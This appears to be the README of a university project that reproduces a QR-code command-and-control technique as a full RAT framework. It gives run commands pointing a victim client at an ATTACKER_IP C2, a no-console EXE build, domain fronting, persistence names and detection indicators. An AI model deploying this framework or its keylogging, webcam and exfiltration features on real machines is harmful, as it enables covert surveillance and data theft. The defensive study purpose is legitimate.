> ⚠️ **EDUCATIONAL SECURITY RESEARCH ONLY**
>
> This project reproduces a technique published by Mandiant (2024) for
> academic study. It is intended **solely for isolated lab environments**
> with explicit authorization. Unauthorized use is illegal. See
> [ETHICS.md](ETHICS.md) for full terms and published detection
> signatures.

[![CI — Security & Tests](https://github.com/Jeevan1725/cyberrecon/actions/workflows/ci.yml/badge.svg)](https://github.com/Jeevan1725/cyberrecon/actions/workflows/ci.yml)

# CyberRecon: QR Code-Based C2 Framework

Reproduction & defensive study of Mandiant's 2024 QR-C2 browser-isolation bypass.

**Status:** Demo-ready · 23 merged PRs · 6 CWEs remediated · SAST clean.

---

## Team

- **Vekeshhari Rajasekar** (CH.SC.U4CYS23051)
- **R Jeevan** (CH.SC.U4CYS23036)
- **Guide:** Dr. S. Udhayakumar
- **Institution:** Amrita School of Computing, Amrita Vishwa Vidyapeetham, Chennai

---

## Overview

CyberRecon is a self-contained QR-Code-based Command & Control (C2) framework that demonstrates how visually rendered QR codes can pass through browser-isolation filters as pixel data.

Unlike Mandiant's 2024 proof-of-concept (which requires the paid Cobalt Strike framework), CyberRecon is fully self-contained, open-source, and reproduces the technique end-to-end.

---

## Key Results

| Metric | Value |
|--------|-------|
| **Throughput** | 400–500 bytes/sec (Mandiant baseline: ~438) |
| **QR decode latency** | ~650ms (Mandiant baseline: ~5s per frame) |
| **RAT features** | 12 (screenshot, webcam, keylogger, clipboard, GPS, process list, system info, file ops, persistence, self-destruct, shell, list files) |
| **Security patches** | 6 CWEs fixed (306, 295, 78, 22, 330, 798) |
| **SAST findings** | 0 HIGH, 0 CVEs, 0 Semgrep, 0 Ruff |
| **External dependencies** | 11 (down from 20+) |
| **Merged PRs** | 23 |

---

## Architecture

```
┌───────────────┐    ┌───────────────┐    ┌───────────────┐
│ Operator CLI  │───▶│  C2 Server    │───▶│  QR Channel   │
│               │◀───│  (Flask)      │    │  (visual)     │
└───────────────┘    └───────┬───────┘    └───────┬───────┘
                             │                    │
                             ▼                    ▼
                     ┌───────────────┐    ┌───────────────┐
                     │  AWS Relay    │    │ Victim Client │
                     │  (optional)   │    │ (Python RAT)  │
                     └───────────────┘    └───────┬───────┘
                                                  │
                                                  ▼
                                          ┌───────────────┐
                                          │  Exfil (HTTP) │
                                          └───────────────┘
```

Full diagrams: [`docs/diagrams/`](docs/diagrams/) — use case, sequence, architecture, deployment, data flow, attack tree (PlantUML + rendered PNG).

---

## Features

### C2 Server (Flask)

- QR-encoded base64-JSON command channel (Level-H error correction)
- Operator-token authentication (`X-Operator-Token` header)
- Live dashboard with real-time polling
- Per-victim exfil storage and bulk ZIP download
- Health check endpoint (`/check`)

### Victim Client (RAT)

- Selenium + headless Chrome QR fetch (faithful to Mandiant technique)
- OpenCV QR decode
- 12 feature modules (see `modules/`)
- Graceful fallback to `requests.get` if Chrome unavailable
- Camera/microphone permission auto-grant for isolated-browser environments

### Multi-Layer Fallback

TCP → HTTP → QR (visual channel is the reliable path).

### Optional Components

- **AWS Relay** (`aws_relay.py`) — traffic relay + domain fronting
- **AI Agent** (`ai_agent.py`) — natural-language command parsing

---

## Why Selenium (and Chrome)?

Mandiant's 2024 QR-C2 technique relies on a **real browser rendering the QR image as pixels**. That pixel stream is what bypasses browser-isolation products — they cannot strip what the user sees.

A plain `requests.get()` only downloads a PNG; it does **not** reproduce the technique. Our client uses **Selenium + headless Chrome** to:

- Reproduce the actual browser rendering pipeline (pixel channel)
- Provide a real Chrome fingerprint (defeats headless-bot detection)
- Auto-grant camera/microphone permissions (some RBI products block dynamic media access before the QR renders)

**Client prerequisite:** Google Chrome must be installed on the victim host. The client falls back to direct `requests`-based fetch if Chrome is unavailable or cannot reach the C2 — functionality preserved, stealth reduced.

**Docker:** the provided `Dockerfile` installs Chrome automatically.

---

## Installation

```bash
git clone https://github.com/Jeevan1725/cyberrecon.git
cd cyberrecon

python -m venv venv
source venv/bin/activate     # Windows: .\venv\Scripts\activate
pip install -r requirements.txt
```

### System dependencies (QR decoding)

- **Ubuntu/Debian:** `sudo apt install libzbar0`
- **macOS:** `brew install zbar`
- **Windows:** included in the `opencv-python` wheel

---

## Quick Start

### Option A — Docker (Recommended)

```bash
# Set an operator token (REQUIRED — the server needs this for auth)
export CYBERRECON_OPERATOR_TOKEN="$(python -c 'import secrets; print(secrets.token_hex(24))')"
echo "Token: $CYBERRECON_OPERATOR_TOKEN"

# Build and start
docker compose up --build -d

# Verify
docker compose ps
# → cyberrecon-c2  Up (healthy)  0.0.0.0:8443->8443/tcp

# Access
# Dashboard:    http://localhost:8443/dashboard
# Health check: http://localhost:8443/check
```

**Security hardening applied by Docker Compose:**
- Read-only root filesystem
- `tmpfs` for writable paths (`/tmp`, `/app/reports`)
- Linux capabilities dropped (`cap_drop: ALL`)
- `no-new-privileges:true`
- Non-root user (UID 1000)
- CPU (1.0 core) and memory (1 GB) limits
- Healthcheck every 30s
- Log rotation (10 MB × 3)

### Option B — Local Python

```bash
# Terminal 1 — C2 server
export CYBERRECON_OPERATOR_TOKEN="demo-token-12345"
python c2_server.py

# Terminal 2 — Operator CLI
python operator_cli.py --c2 http://127.0.0.1:8443 --token demo-token-12345

# Terminal 3 — Victim client (in isolated lab VM)
python rat_client.py --c2 http://<ATTACKER_IP>:8443 --auto-register --interval 3

# Browser — Dashboard
open http://127.0.0.1:8443/dashboard
```

### Enable LAN Access (for multi-system demo)

By default, Docker binds to `127.0.0.1:8443` (localhost only). To accept connections from a victim VM:

```yaml
# docker-compose.yml
ports:
  - "0.0.0.0:8443:8443"   # lab only — never on public networks
```

Also add a Windows firewall rule (admin PowerShell):

```powershell
New-NetFirewallRule -DisplayName "CyberRecon C2 8443" -Direction Inbound -LocalPort 8443 -Protocol TCP -Action Allow
```

---

## Environment Variables

| Variable | Default | Purpose |
|----------|---------|---------|
| `CYBERRECON_OPERATOR_TOKEN` | (required) | Auth token for `/command` and `/download-all` |
| `CYBERRECON_REQUIRE_AUTH` | `true` | Toggle auth enforcement (fail-closed) |
| `CYBERRECON_C2` | `http://127.0.0.1:8443` | C2 URL used by client |
| `CYBERRECON_CA_BUNDLE` | (optional) | Custom CA bundle for TLS |
| `C2_HOST` | `0.0.0.0` | C2 bind address |
| `C2_PORT` | `8443` | C2 bind port |

Copy `.env.example` to `.env` and edit.

---

## File Structure

```
cyberrecon/
├── c2_server.py             # Flask C2 + QR encoder + dashboard
├── rat_client.py            # Victim client (12 features)
├── operator_cli.py          # Operator console
├── aws_relay.py             # Optional traffic relay
├── main.py                  # Unified launcher
├── config.py                # Global configuration
├── ai_agent.py              # NL command parser
├── modules/                 # RAT feature modules
│   ├── keylogger.py
│   ├── screenshot.py
│   ├── webcam.py
│   ├── gps.py
│   ├── stealth.py
│   └── persistence.py
├── tests/                   # Pytest suite
├── docs/
│   ├── report/              # 6 documents + evidence
│   ├── diagrams/            # 6 PlantUML diagrams
│   └── adr/                 # Architecture Decision Records
├── reports/                 # SAST evidence artifacts
├── Dockerfile               # Multi-stage hardened build
├── docker-compose.yml       # Hardened Compose definition
├── bandit.yaml              # Bandit SAST rules
├── pyproject.toml           # Ruff + pytest config
├── requirements.txt         # 11 runtime deps
└── requirements-dev.txt     # + pytest, bandit, pip-audit, pyinstaller, ruff
```

---

## Documentation

| Document | Purpose |
|----------|---------|
| [docs/report/03-requirements.md](docs/report/03-requirements.md) | Software Requirements Specification |
| [docs/report/04-architecture.md](docs/report/04-architecture.md) | Component architecture + data flow |
| [docs/report/06-threat-model.md](docs/report/06-threat-model.md) | STRIDE analysis + MITRE ATT&CK mapping |
| [docs/report/07-security-features.md](docs/report/07-security-features.md) | 43 security controls + 9 remediated anti-patterns |
| [docs/report/08-security-testing.md](docs/report/08-security-testing.md) | Bandit, Semgrep, pip-audit, Ruff results |
| [docs/report/09-dependency-analysis.md](docs/report/09-dependency-analysis.md) | Module fan-in/fan-out + reduction (20+ → 11) |
| [docs/diagrams/](docs/diagrams/) | 6 PlantUML diagrams (rendered PNGs) |
| [ETHICS.md](ETHICS.md) | Ethical terms + published IOCs for defenders |

---

## Security

### Implemented Controls (43 total)

- **Authentication:** Operator token auth on `/command` and `/download-all`; fail-closed on misconfiguration
- **Transport:** TLS verification enforced by default; configurable CA bundle
- **Input validation:** `shell=False` subprocess; shell-metacharacter blocklist; path-traversal validation
- **Cryptographic randomness:** CSPRNG victim/command IDs (`secrets.token_hex`)
- **Supply chain:** Dependabot + 7-day cooldown; secret scanning; push protection
- **Runtime isolation:** Non-root Docker user; read-only root FS; capability drop; `no-new-privileges`
- **Software integrity:** Branch protection; required status checks; audit trail
- **Static analysis:** Bandit + Semgrep + pip-audit + Ruff on every push/PR

Full catalog: [docs/report/07-security-features.md](docs/report/07-security-features.md)

### Remediated CWEs

| CWE | Description | Fix |
|-----|-------------|-----|
| CWE-306 | Missing auth on critical endpoints | `@require_operator_token` decorator |
| CWE-295 | Improper certificate validation | Enforce TLS verify; support CA bundle |
| CWE-78 | OS command injection (`shell=True`) | `shlex.split` + `shell=False` + blocklist |
| CWE-22 | Path traversal in launcher | `realpath` validation + extension whitelist |
| CWE-330 | Insufficient random values | CSPRNG via `secrets.token_hex` |
| CWE-798 | Hardcoded credentials | Env vars + CSPRNG fallback |

### SAST Results

| Tool | Before | After |
|------|--------|-------|
| Bandit | 25 (4 HIGH) | 17 (0 HIGH) |
| Semgrep | 5 | 0 |
| pip-audit | 0 CVEs | 0 CVEs |
| Ruff | 131 | 0 |

Full evidence: [docs/report/08-security-testing.md](docs/report/08-security-testing.md)

---

## CI/CD

### CI — Security & Tests (`.github/workflows/ci.yml`)

Runs on every push to `main` and every PR:

1. **Security Scan** — Bandit (SAST) + pip-audit (SCA) + Ruff (lint)
2. **Unit Tests** — pytest with coverage

Report artifacts uploaded per run.

### CD — Release Deploy (`.github/workflows/cd.yml`)

Triggers on `v*` tags or manual dispatch:

1. Run tests
2. Run Bandit
3. Build Docker image
4. Create GitHub Release with tarball + SAST report

### Branch Protection

The `main` branch is protected by a ruleset requiring:
- Pull request + 1 approval
- Required status checks: `Security Scan` + `Unit Tests`
- No force pushes; no deletions
- Admin bypass with audit trail

---

## Testing

```bash
# Full test suite
pytest tests/ -v

# With coverage
pytest tests/ -v --cov=. --cov-report=html

# SAST
bandit -r . -c bandit.yaml
semgrep --config=p/python --config=p/owasp-top-ten .
pip-audit -r requirements.txt
ruff check .
```

---

## Building the EXE (Optional)

```bash
pip install pyinstaller

pyinstaller --onefile --noconsole --name CyberReconClient \
    --hidden-import=pynput.keyboard._win32 \
    --hidden-import=pynput.mouse._win32 \
    --collect-all selenium \
    --collect-all cv2 \
    rat_client.py
```

Output: `dist/CyberReconClient.exe` (~94 MB).

---

## Threat Model & Defensive Value

The technique reproduces Mandiant's 2024 QR-C2 (T1071.001, T1132.001, T1090.004, etc.) plus standard RAT behaviors (T1113, T1125, T1056.001, T1115).

Defenders should look for:

- **Network:** Repeated POST to `/exfil/*` (beaconing), non-standard ports
- **Host:** Registry Run key `WindowsSecurityUpdate`, `WindowsUpdateTask` scheduled task, `wevtutil cl` invocations
- **Application:** Chrome `--headless=new` + `--use-fake-ui-for-media-stream`, OpenCV loads in Python process
- **Data:** Large base64 POSTs, clipboard reads without user action, webcam access without user action

Full detection guidance + attack tree: [docs/report/06-threat-model.md](docs/report/06-threat-model.md) and [docs/diagrams/attack-tree.md](docs/diagrams/attack-tree.md)

---

## License

See [LICENSE](LICENSE) — MIT with research clause.

---

## References

1. Mandiant (2024) — "(QR) Coding My Way Out of Here: C2 in Browser Isolation Environments"
2. Agarwal et al. (2022) — "Spook.js: Attacking Chrome Strict Site Isolation via Speculative Execution" (IEEE S&P)
3. Koptyra & Ogiela (2024) — "Information Hiding in QR Codes using Segment Manipulation" (IEEE PerCom)
4. Jin et al. (2022) — "Timing-Based Browsing Privacy Vulnerabilities Via Site Isolation" (IEEE S&P)

---

## Acknowledgments

- Amrita School of Computing, Chennai Campus
- Department of CSE — Cyber Security
- Guide: Dr. S. Udhayakumar
